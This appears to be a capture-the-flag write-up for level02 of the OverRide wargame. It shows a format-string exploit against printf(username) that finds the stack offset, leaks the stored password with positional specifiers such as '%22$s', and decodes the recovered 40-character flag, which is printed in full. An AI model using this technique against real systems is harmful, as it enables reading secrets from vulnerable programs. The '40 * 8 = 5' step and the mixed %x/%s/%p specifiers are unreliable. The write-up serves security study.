It is not possible to overflow this program but we have this ;

```c
printf((char *)username);
puts(" does not have access!");
```

We can perform a format string exploit

```sh
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAA %28$p
--[ Password:
*****************************************
AAAAAAAA 0x4141414141414141 does not have access!
level02@OverRide:~$
```

We found where the string is now.

We know that the 1 argument address passed to a function is store in rdi in asm x64.

```sh
0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax
0x0000000000400a9a <+646>:   mov    %rax,%rdi
0x0000000000400a9d <+649>:   mov    $0x0,%eax
0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>
```

So our format parameter found at the offset of 28 is at rbp - 0x70 (112).

```
0x0000000000400a4a <+566>:   lea    -0x110(%rbp),%rcx
0x0000000000400a51 <+573>:   lea    -0xa0(%rbp),%rax
0x0000000000400a58 <+580>:   mov    $0x29,%edx
0x0000000000400a5d <+585>:   mov    %rcx,%rsi
0x0000000000400a60 <+588>:   mov    %rax,%rdi
```

And we know that the content of .pass that is cmp with our input is at rbp - a0 (160)

160 - 112 = 48

%x read 8 bytes by 8 bytes so

28 - 48/8 = 22

flags are 40 char long

40 * 8 = 5

so `%22$x %23$x %24$x %25$x %26$x`

```sh
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$s %23$s %24$s %25$s %26$s
--[ Password: gg
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

Then we pass it to our python script to read it has a string and in the good way

```sh
hkovac@machine:~/override(main⚡) » python3 script.py 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```